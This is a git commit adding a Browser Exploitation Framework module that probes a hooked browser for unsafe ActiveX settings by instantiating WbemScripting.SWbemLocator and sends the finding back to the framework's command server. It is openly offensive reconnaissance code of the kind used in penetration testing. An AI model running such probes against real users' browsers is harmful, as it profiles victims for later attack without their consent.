a87a161bc10ec95bf6397f941052e6b42627f81f
bcoles <bcoles@gmail.com>
2012-01-10 17:33:26 +1030

    Added module Detect Unsafe ActiveX

---
+++ modules/browser/detect_unsafe_activex/command.js
@@ -0,0 +1,39 @@
+//
+//   Copyright 2012 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
+beef.execute(function() {
+
+	var unsafe = true;
+	var result = "";
+	var test;
+
+	try {
+		test = new ActiveXObject("WbemScripting.SWbemLocator");
+	} catch (e) {
+		unsafe = false;
+	}
+
+	test = null;
+
+	if (unsafe) {
+		result = "Browser is configured for unsafe ActiveX";
+	} else {
+		result = "Browser is NOT configured for unsafe ActiveX";
+	}
+
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "unsafe_activex="+result);
+
+});
+
